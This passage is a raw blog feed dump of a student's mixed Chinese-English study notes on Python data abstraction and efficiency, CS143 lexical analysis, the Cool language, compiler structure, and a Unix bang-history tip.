class="hljs-params"><span class="hljs-variable language_">self</span>, other</span>):<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.mul(other)<br></code></pre></td></tr></table></figure><p><mark>Special method names</mark><br>和行为挂钩, 比如:<code>_add_</code> 和 <code>+</code> 相关, 做<code>+</code>运算时会自动调用<code>_add_</code>.</p><p>An <mark>interface</mark> is a set of shared attribute names, along with a specification of their behavior.</p><p>The <code>@property</code> decorator allows functions to be called without call expression syntax. 也就是调用 method 时后面不用加括号.</p><p>Multiple representations of data, 也就是一种数据用多种表示方法.</p><h3 id="2-7-4-Generic-Functions"><a href="#2-7-4-Generic-Functions" class="headerlink" title="2.7.4 Generic Functions"></a>2.7.4 Generic Functions</h3><p>Generic functions are methods or functions that apply to arguments of different types.</p><p>The built-in function <code>isinstance</code> takes an object and a class. It returns true if the object has a class that either is or inherits from the given class.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c = ComplexRI(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, ComplexRI)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, Complex)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, ComplexMA)</span><br>False<br></code></pre></td></tr></table></figure><p>使用 <code>type_tag</code> attribute.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Rational.type_tag = <span class="hljs-string">&#x27;rat&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Complex.type_tag = <span class="hljs-string">&#x27;com&#x27;</span></span><br></code></pre></td></tr></table></figure><h4 id="Coercion"><a href="#Coercion" class="headerlink" title="Coercion"></a>Coercion</h4><p>Often the different data types are not completely independent, and there may be ways by which objects of one type may be viewed as being of another type. This process is called <mark>coercion</mark>.</p><p>Here is a typical coercion function, which transforms a rational number to a complex number with zero imaginary part:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&gt;&gt;&gt; def rational<span class="hljs-constructor">_to_complex(<span class="hljs-params">r</span>)</span>:<br>        return <span class="hljs-constructor">ComplexRI(<span class="hljs-params">r</span>.<span class="hljs-params">numer</span><span class="hljs-operator">/</span><span class="hljs-params">r</span>.<span class="hljs-params">denom</span>, 0)</span><br></code></pre></td></tr></table></figure><p>It is not generally possible to coerce an arbitrary data object of each type into all other types.</p><p>This coercion scheme has some advantages over the method of defining explicit cross-type operations.</p><p>Although we still need to write coercion functions to relate the types, we need to write only one function for each pair of types rather than a different function for each set of types and each generic operation.</p><p>Some more sophisticeted coercion schemes do nut just try to coerce one type into another, but instead may try to coerce two different types each into a third common type.</p><h2 id="2-8-Efficiency"><a href="#2-8-Efficiency" class="headerlink" title="2.8 Efficiency"></a>2.8 Efficiency</h2><h3 id="2-8-1-Measuring-Efficiency"><a href="#2-8-1-Measuring-Efficiency" class="headerlink" title="2.8.1 Measuring Efficiency"></a>2.8.1 Measuring Efficiency</h3><p>Inspecting how many times <code>fib</code> is called:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">f</span>):<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">counted</span>(<span class="hljs-params">*args</span>):<br>          counted.call_count += <span class="hljs-number">1</span><br>          <span class="hljs-keyword">return</span> f(*args)<br>      counted.call_count = <span class="hljs-number">0</span><br>      <span class="hljs-keyword">return</span> counted<br>      &gt;&gt;&gt; fib = count(fib)<br><span class="hljs-meta">&gt;&gt;&gt; </span>fib(<span class="hljs-number">19</span>)<br><span class="hljs-number">4181</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>fib.call_count<br><span class="hljs-number">13529</span><br></code></pre></td></tr></table></figure><h4 id="Space"><a href="#Space" class="headerlink" title="Space"></a>Space</h4><p>The interpreter preserves all active environment and all values and frames referenced by those environments.</p><p>An environment is active if it provides the evaluation context for some expression being evaluated. An environment becomes inactive whenever the function call for which its first frame was ceated finally returns.</p><h3 id="2-8-2-Memoization"><a href="#2-8-2-Memoization" class="headerlink" title="2.8.2 Memoization"></a>2.8.2 Memoization</h3><p>Tree-recursive computational processes can often be made more efficient through memoization.</p><p>A memoized function will store the return value for any arguments it has previously received. 就是以前计算过的值在 recursive computation 中不会被计算第二次.</p><h3 id="2-8-3-Orders-of-Growth"><a href="#2-8-3-Orders-of-Growth" class="headerlink" title="2.8.3 Orders of Growth"></a>2.8.3 Orders of Growth</h3><h2 id="2-9-Recursive-Objects"><a href="#2-9-Recursive-Objects" class="headerlink" title="2.9 Recursive Objects"></a>2.9 Recursive Objects</h2><p>Objects can have other objects as attribute values. When an object of some class has an attribute value of that same class, it is a recursive object.</p><h3 id="2-9-1-Linked-List-Class"><a href="#2-9-1-Linked-List-Class" class="headerlink" title="2.9.1 Linked List Class"></a>2.9.1 Linked List Class</h3><p>The empty list is a special case of a linked list that has no first element or rest.</p><p>A linked list is a sequence: it has a finite length and supports element selection by index.</p><p>These bulit-in functions invoke special method names of a class: length is computed by <code>_len_</code> and element selection is computed by <code>_getitem_</code>.</p><h3 id="2-9-3-Sets"><a href="#2-9-3-Sets" class="headerlink" title="2.9.3 Sets"></a>2.9.3 Sets</h3><p>Sets are unordered collections, and so the printed ordering may differ from the element ordering in the set literal.</p><p>Python sets support a vatiety of operations, including membership tests, length computation, and the standard set operations of union and intersection.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">3</span> <span class="hljs-keyword">in</span> s</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(s)</span><br>4<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">s.union(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;)</span><br>&#123;1, 2, 3, 4, 5&#125;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">s.intersection(&#123;<span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>&#125;)</span><br>&#123;3, 4&#125;<br><br></code></pre></td></tr></table></figure><p>Sets comparison:</p><ul><li>isdisjoint</li><li>issubset</li><li>issuperset<br>Mutable, change one element at a time:</li><li>add</li><li>remove</li><li>discard</li><li>pop<br>Multi-element mutations:</li><li>clear</li><li>update</li></ul><h1 id="Chapter-3-Interpreting-Computer-Programs"><a href="#Chapter-3-Interpreting-Computer-Programs" class="headerlink" title="Chapter 3: Interpreting Computer Programs"></a>Chapter 3: Interpreting Computer Programs</h1><h2 id="3-1-Introduction"><a href="#3-1-Introduction" class="headerlink" title="3.1 Introduction"></a>3.1 Introduction</h2><h3 id="3-1-1-Programming-Language"><a href="#3-1-1-Programming-Language" class="headerlink" title="3.1.1 Programming Language"></a>3.1.1 Programming Language</h3><h2 id="3-2-Functional-Programming"><a href="#3-2-Functional-Programming" class="headerlink" title="3.2 Functional Programming"></a>3.2 Functional Programming</h2>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS143 Notes</title>
    <link href="/2022/07/30/CS143-Notes/"/>
    <url>/2022/07/30/CS143-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="p7-Lexical-Analysis"><a href="#p7-Lexical-Analysis" class="headerlink" title="p7 Lexical Analysis"></a>p7 Lexical Analysis</h1><p>Token classes correspond to sets of strings.</p><p>Identifier: strings of letters of digits, starting with a letter.</p><p>Integer: a non-empty string of digits.</p><p>Keyword:</p><p>Whitespace: a non-empty sequence of blanks, newlines, and tabs.</p><p>Classify program substrings according to role.</p><p>&lt;class,string&gt; 这个东西称为 token.</p><p>如果有一段代码:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span>(<span class="hljs-attribute">i</span>==j)<br>  <span class="hljs-attribute">z</span>=0;<br><span class="hljs-keyword">else</span><br>  <span class="hljs-attribute">z</span>=1;<br></code></pre></td></tr></table></figure><p>在 Lexical Analyser 看来就是:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\t</span>if(i==j)<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=0;<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span>else<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=1;<br></code></pre></td></tr></table></figure><p>Often the punctuation marks of the language are in token classes all by themselves.</p><p>连在一起的 whitespace 会被 group 为一个 token.</p><p>An implementation must do two things:</p><ol><li>Recognize substrings corresponding to tokens.<ul><li>The lexemes(the substrings are called lexemes)</li></ul></li><li>Identify the token class of each lexeme.</li></ol><p>&lt;token class, lexeme&gt; – a token,</p><h1 id="p8-Lexical-Analysis-Example"><a href="#p8-Lexical-Analysis-Example" class="headerlink" title="p8 Lexical Analysis Example"></a>p8 Lexical Analysis Example</h1><p>FORTRAN rule: Whitespace is insignificant.</p><p><code>VAR1</code> is the same as <code>VA</code>  <code>R1</code>.</p><p>Lookahead, in order to understand the role of something as we are going left to right.</p><p>One of the goal in the design of lexical system is to minimize the amount of lookahead or bound the amount of lookahead that is required.</p><p>重点:</p><ol><li>The goal is to partition the string. This is implemented by reading left-to-right, recongnizing one token at a time.</li><li>Lookahead may be required to decide where one token ends and the next token begins.</li></ol><h1 id="p9-Regular-Languages"><a href="#p9-Regular-Languages" class="headerlink" title="p9 Regular Languages"></a>p9 Regular Languages</h1><p>Summarize:<br>    - Regular expressions specify regular languages<br>    - Five constructs:<br>        - Two base cases: empty and 1-character strings<br>        - Three compound expressions: union, concatenation, iteration.</p><h1 id="p10-Formal-Languages"><a href="#p10-Formal-Languages" class="headerlink" title="p10 Formal Languages"></a>p10 Formal Languages</h1><p>A formal language is just any set of strings over some alphabet.</p><p>如:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Alphabet</span> <span class="hljs-operator">=</span> English<br>characters<br><br><span class="hljs-attribute">Language</span> <span class="hljs-operator">=</span> English<br>sentences<br><br><span class="hljs-attribute">Alphabet</span> <span class="hljs-operator">=</span> ASCII<br><span class="hljs-attribute">Language</span> <span class="hljs-operator">=</span> C programs<br></code></pre></td></tr></table></figure><p>Meaning function L maps syntax to semantics:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">L</span><span class="hljs-params">(e)</span></span> = M<br></code></pre></td></tr></table></figure><p><mark>Meaning is many to one</mark>, syntax 对 semantic 是多对一。</p><h1 id="p11-Lexical-Specification"><a href="#p11-Lexical-Specification" class="headerlink" title="p11 Lexical Specification"></a>p11 Lexical Specification</h1><p>Whitespace: a non-empty sequences of blanks, newlines, and tabs.</p><h1 id="p12-Lexical-Specification"><a href="#p12-Lexical-Specification" class="headerlink" title="p12 Lexical Specification"></a>p12 Lexical Specification</h1><p>“Maximal Munch”. 取长的 string.</p><p>When there is more than one token class to which a string might belong, 通过优先级，choose the one listed first.</p><p><mark>If no rule matches:</mark><br>Making a <code>Error</code> regex for all strings not in the lexical specification. And put it last in priority.</p><p><mark>Summarise</mark><br>Regular expressions are a concise notation for string patterns.</p><p>Use in lexical analysis requires small extensions:<br>    - To resolve ambiguities: match as long as possible; highest priority match<br>    - To handle errors</p><h1 id="p13-Finite-Automata"><a href="#p13-Finite-Automata" class="headerlink" title="p13 Finite Automata"></a>p13 Finite Automata</h1>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Using bang in Unix to repeat command</title>
    <link href="/2022/07/29/Using-bang-in-Unix-to-repeat-command/"/>
    <url>/2022/07/29/Using-bang-in-Unix-to-repeat-command/</url>
    
    <content type="html"><![CDATA[<p>举个例子:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>!l<br></code></pre></td></tr></table></figure><p>会重复上一个以<code>l</code>开头的命令。</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cool language Notes</title>
    <link href="/2022/07/29/Cool-language-Notes/"/>
    <url>/2022/07/29/Cool-language-Notes/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">i : <span class="hljs-type">IO</span> &lt;- <span class="hljs-keyword">new</span> IO;<br></code></pre></td></tr></table></figure><p><code>new</code> 用于创建 object , 后一个<code>IO</code>是 object的类型。<code>&lt;-</code> 似乎是赋值的意思。</p><p>用<code>let ...  in</code>创建local variable.</p><p><code>if then else</code> statement.</p><p>The last statement of the block is the value of the block. 这个和perl中一样.</p><p><code>=</code> 在COOL中是比较operator.</p><p>The special value <code>void</code> is a member of all types and is used as the default initialzation for variable. There is no name for void.</p><p><code>isvoid</code> expr, which tests whether a value is void.</p><p>A dispatch to or case on void generates a runtime error.</p><p>A statement o  an expression block has to be included in its own set of curly braces. 如:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>(): Int &#123; &#123; <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.out_string</span>(&quot;Hello World!&quot;); <span class="hljs-number">1</span>; &#125; &#125;;<br></code></pre></td></tr></table></figure><p>第一个 curly braces is the body of the <code>main</code> program, and the second braces means a block of expression.</p><h1 id="6-Method"><a href="#6-Method" class="headerlink" title="6 Method"></a>6 Method</h1><p>The type of the method body must conform to th  declared return type.</p><h1 id="7-Expressions"><a href="#7-Expressions" class="headerlink" title="7 Expressions"></a>7 Expressions</h1><h2 id="7-2-Identifiers"><a href="#7-2-Identifiers" class="headerlink" title="7.2 Identifiers"></a>7.2 Identifiers</h2><p>It is an error to assign to <code>self</code> or bind <code>self</code> in a <code>let</code>, a <code>case</code>, or as a formal parameter.</p><p>It is also illegal to have attributes named self.</p><h2 id="7-4-Dispatch"><a href="#7-4-Dispatch" class="headerlink" title="7.4 Dispatch"></a>7.4 Dispatch</h2><p>就是 method call.</p><p>The value of the expression is the value returned by the method invocation.</p><p>Inferring accurate static types for dispatch expression is what justifies including SELF_TYPE in the Cool type system.</p><p>Three ways to dispatch:</p><pre><code class="hljs">- &lt;expr&gt;.&lt;id&gt;(&lt;expr&gt;,...,&lt;expr&gt;)- &lt;id&gt;(&lt;expr&gt;,...,&lt;expr&gt;)- &lt;expr&gt;@&lt;type&gt;.id(&lt;expr&gt;,...,&lt;expr&gt;)</code></pre><h2 id="7-5-Conditionals"><a href="#7-5-Conditionals" class="headerlink" title="7.5 Conditionals"></a>7.5 Conditionals</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">then</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">else</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>The predicate is evaluated first, if the predicate is true, then the <code>then</code> branch is evaluated. If the predicate is false, then the <code>else</code> branch is evaluated.</p><h2 id="7-6-Loops"><a href="#7-6-Loops" class="headerlink" title="7.6 Loops"></a>7.6 Loops</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> &lt;<span class="hljs-built_in">expr</span>&gt; loop &lt;<span class="hljs-built_in">expr</span>&gt; pool<br></code></pre></td></tr></table></figure><p>If the predicate is false, the loop terminates and <code>void</code> is returned.</p><h2 id="7-7-Blocks"><a href="#7-7-Blocks" class="headerlink" title="7.7 Blocks"></a>7.7 Blocks</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; <span class="hljs-tag">&lt;<span class="hljs-name">expr</span>&gt;</span>; ... <span class="hljs-tag">&lt;<span class="hljs-name">expr</span>&gt;</span>; &#125;<br></code></pre></td></tr></table></figure><p>The static type of a block is the static type of the last expression.</p><p><mark>Semi-colons</mark> are used as terminators in lists of expressions and not as expression separators. Semi-colons also terminate other Cool constructs. 这句话的意思是，每一个 semicolon 表示一个 expression 的结束，然后会按顺序执行下一个 expression.</p><p>Block 里面的每一个 expression 都要有 semicolon, body 里面只有一个 expression 且不用 semicolon.</p><h2 id="7-8-Let"><a href="#7-8-Let" class="headerlink" title="7.8 Let"></a>7.8 Let</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-symbol">&lt;id1&gt;</span>: <span class="hljs-symbol">&lt;type1&gt;</span> [ &lt;- <span class="hljs-symbol">&lt;expr&gt;</span> ], ..., <span class="hljs-symbol">&lt;idn&gt;</span>: <span class="hljs-symbol">&lt;typen&gt;</span> [ &lt;- <span class="hljs-symbol">&lt;exprn&gt;</span> ] in <span class="hljs-symbol">&lt;expr&gt;</span><br></code></pre></td></tr></table></figure><p>The value of the let is the value of the body.</p><p>If an identifier is defined multiple times in a let, later bindings hide earlier ones.</p><h2 id="7-9-Case"><a href="#7-9-Case" class="headerlink" title="7.9 Case"></a>7.9 Case</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">case</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">expr0</span>&gt;</span> of </span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">id1</span>&gt;</span>: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">type1</span>&gt;</span> =&gt; </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">expr1</span>&gt;</span>;</span><br><span class="language-xml"></span><br><span class="language-xml">    ...</span><br><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">idn</span>&gt;</span>: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">typen</span>&gt;</span> =&gt; </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">exprn</span>&gt;</span>;</span><br><span class="language-xml">esac</span><br></code></pre></td></tr></table></figure><p>The result of the case is the value of <exprk>.</p><p><code>case</code> 是根据<code>&lt;expr0&gt;</code> 和 <code>&lt;idn&gt;</code> 的 <code>type</code> 来决定是否执行。</p><h2 id="7-10-New"><a href="#7-10-New" class="headerlink" title="7.10 New"></a>7.10 New</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">isvoid <span class="hljs-built_in">expr</span><br></code></pre></td></tr></table></figure><h2 id="7-12-Arithmetic-and-Comparison-Operations"><a href="#7-12-Arithmetic-and-Comparison-Operations" class="headerlink" title="7.12 Arithmetic and Comparison Operations"></a>7.12 Arithmetic and Comparison Operations</h2><p>Four binary arithmetic operations: +, -, *, &#x2F;.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">expr1 <span class="hljs-tag">&lt;<span class="hljs-name">op</span>&gt;</span> expr2<br></code></pre></td></tr></table></figure><p>The static types of the two sub-expression must be <code>Int</code>. The static type of the expression is <code>Int</code>. Cool has only integer division.</p><p>Cool has only three comparison operations: &lt;, &lt;&#x3D;, &#x3D;.</p><p>The expression <code>~&lt;expr&gt;</code> is the integer complement of <expr>.</p><p>The expression <code>not &lt;expr&gt;</code> is the boolean complement of <expr>.</p><h1 id="8-Basic-Classes"><a href="#8-Basic-Classes" class="headerlink" title="8 Basic Classes"></a>8 Basic Classes</h1><h2 id="8-1-Object"><a href="#8-1-Object" class="headerlink" title="8.1 Object"></a>8.1 Object</h2><p>The <code>Object</code> class is the root of the inheritance graph.</p><h2 id="8-2-IO"><a href="#8-2-IO" class="headerlink" title="8.2 IO"></a>8.2 IO</h2><p>A class can make use of the methods in the IO class by inheriting from IO. It is an error to redifine the IO class.</p><h2 id="8-3-Int"><a href="#8-3-Int" class="headerlink" title="8.3 Int"></a>8.3 Int</h2><p>The default initilization for variables of type Int is 0(not void).</p><h2 id="8-4-String"><a href="#8-4-String" class="headerlink" title="8.4 String"></a>8.4 String</h2><p>The default initilization for variables of type String is “”(not void).</p><h2 id="8-5-Bool"><a href="#8-5-Bool" class="headerlink" title="8.5 Bool"></a>8.5 Bool</h2><p>The Bool class provides <code>true</code> and <code>dault</code>. The default initilization for variables of type Bool is false(not void).</p><h1 id="9-Main-Class"><a href="#9-Main-Class" class="headerlink" title="9 Main Class"></a>9 Main Class</h1><p>Every program  must have a class <code>Main</code>. The <code>Main</code> class must have a method <code>main</code> that takes no formal parameters. The <code>main</code> method must be defined in class <code>Main</code>. </p><h1 id="10-Lexical-Structure"><a href="#10-Lexical-Structure" class="headerlink" title="10 Lexical Structure"></a>10 Lexical Structure</h1><p>The lexical units of Cool are integers, type identifiers, object identifiers, special notation, strings, key-words, and white space.</p><h2 id="10-2-Strings"><a href="#10-2-Strings" class="headerlink" title="10.2 Strings"></a>10.2 Strings</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot;This \</span><br><span class="hljs-keyword">is</span> OK<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><p>A string may not contain EOF, A string may not contain the null(character \0).</p><h2 id="10-3-Comments"><a href="#10-3-Comments" class="headerlink" title="10.3 Comments"></a>10.3 Comments</h2><p>There are two forms of comments:</p><pre><code class="hljs"> --(*...*)</code></pre><h1 id="11-Cool-Syntax"><a href="#11-Cool-Syntax" class="headerlink" title="11 Cool Syntax"></a>11 Cool Syntax</h1><h1 id="12-Type-Rules"><a href="#12-Type-Rules" class="headerlink" title="12 Type Rules"></a>12 Type Rules</h1><h2 id="12-1-Type-Environments"><a href="#12-1-Type-Environments" class="headerlink" title="12.1 Type Environments"></a>12.1 Type Environments</h2><p>Three parts: a method environment M, an object environment O, and the name of the current class in which the expression appears. The method environment and object environment are both functions(also called mappings).</p><h2 id="12-2-Type-Checking-Rules"><a href="#12-2-Type-Checking-Rules" class="headerlink" title="12.2 Type Checking Rules"></a>12.2 Type Checking Rules</h2><h1 id="13-Operational-Semantics"><a href="#13-Operational-Semantics" class="headerlink" title="13 Operational Semantics"></a>13 Operational Semantics</h1><p>The context has three components:<br>    - an environment<br>    - a store<br>    - a self object</p><h2 id="13-1-Environment-and-the-Store"><a href="#13-1-Environment-and-the-Store" class="headerlink" title="13.1 Environment and the Store"></a>13.1 Environment and the Store</h2><p>An environment is a mapping of variable identifiers to locations.</p><p>To describe the environment:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">E</span> = [a:l1,b:l2]<br></code></pre></td></tr></table></figure><p>This environment maps a to location l1, and b to location l2.</p><p>The store(memory) maps location to values. Intuitively, a store tells us what value is stored in a given memory location.</p><p>A store is similar to an environment:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">S = [<span class="hljs-function"><span class="hljs-title">l1</span> -&gt;</span> <span class="hljs-number">55</span>, <span class="hljs-function"><span class="hljs-title">l2</span> -&gt;</span> <span class="hljs-number">77</span>]<br></code></pre></td></tr></table></figure><h2 id="13-2-Syntax-for-Cool-Objects"><a href="#13-2-Syntax-for-Cool-Objects" class="headerlink" title="13.2 Syntax for Cool Objects"></a>13.2 Syntax for Cool Objects</h2><p>Every Cool value is an object.</p><h2 id="13-3-Class-definitions"><a href="#13-3-Class-definitions" class="headerlink" title="13.3 Class definitions"></a>13.3 Class definitions</h2><p>Two mappings, called class and implementation, are associated with class definitions.</p><p>The default initializing for a variable or attribute is the default of its type.</p>]]></content>
    
    
    <categories>
      
      <category>Cool</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Compilers Priciples, Techniques, &amp; Tools Notes</title>
    <link href="/2022/07/28/Compilers-Priciples-Techniques-Tools-Notes/"/>
    <url>/2022/07/28/Compilers-Priciples-Techniques-Tools-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1 Introduction"></a>Chapter 1 Introduction</h1><h2 id="1-1-Language-Processors"><a href="#1-1-Language-Processors" class="headerlink" title="1.1 Language Processors"></a>1.1 Language Processors</h2><h3 id="1-1-1-Exercises-for-Section-1-1"><a href="#1-1-1-Exercises-for-Section-1-1" class="headerlink" title="1.1.1 Exercises for Section 1.1"></a>1.1.1 Exercises for Section 1.1</h3><p>编译器和解释器的区别:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">编译器工作时，返回低级的代码，如machine language.<br><br>解释器工作时，产生机器码交给硬件直接执行，然后返回结果.<br></code></pre></td></tr></table></figure><h2 id="1-2-The-Structure-of-a-Compiler"><a href="#1-2-The-Structure-of-a-Compiler" class="headerlink" title="1.2 The Structure of a Compiler"></a>1.2 The Structure of a Compiler</h2><p>Two parts to this mapping: analysis and synthesis. </p><p>The analysis part also collects information about the source program and stores it in a data structure called a <code>symbol table</code>.</p><p>The analysis part is often called the front end of the compiler, the synthesis part is the back end.</p><p>The analysis part <mark>breaks up</mark> the source program into constituent pieces and imposes a grammatical structure on them.</p><p>The synthesis part <mark>constructs</mark> the desired target program.</p><h3 id="1-2-1-Lexical-Analysis"><a href="#1-2-1-Lexical-Analysis" class="headerlink" title="1.2.1 Lexical Analysis"></a>1.2.1 Lexical Analysis</h3><p>For each lexeme, the lexical analyzer produces as output a token of the form:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;token-<span class="hljs-type">name</span>, <span class="hljs-keyword">attribute</span>-<span class="hljs-keyword">value</span>&gt;<br></code></pre></td></tr></table></figure><p>Lexical analysis divides program text into “words” or “tokens”.</p><h3 id="1-2-2-Syntax-Analysis"><a href="#1-2-2-Syntax-Analysis" class="headerlink" title="1.2.2 Syntax Analysis"></a>1.2.2 Syntax Analysis</h3><p>A typical representation is a <mark>syntax tree</mark> in which each interior node represents an operation and the children of the node represent the arguments of the operation.</p><p>The tree shows the order in which the operations in the assignment.</p><h3 id="1-2-3-Semantic-Analysis"><a href="#1-2-3-Semantic-Analysis" class="headerlink" title="1.2.3 Semantic Analysis"></a>1.2.3 Semantic Analysis</h3><p>An important part of semantic snalysis is type checking, where the compiler checks that each operator has matching operands.</p><p>The operator inttofloat, which explicity converts its integer argument into a floating-point number.</p><h3 id="1-2-4-Intermediate-Code-Generation"><a href="#1-2-4-Intermediate-Code-Generation" class="headerlink" title="1.2.4 Intermediate Code Generation"></a>1.2.4 Intermediate Code Generation</h3><p>Syntax trees are a form of intermediate representation.</p><p>The intermediate representation should have two important properties:</p><pre><code class="hljs">- it should be easy to produce- it should be easy to translate into the target machine</code></pre><h3 id="1-2-5-Code-Optimization"><a href="#1-2-5-Code-Optimization" class="headerlink" 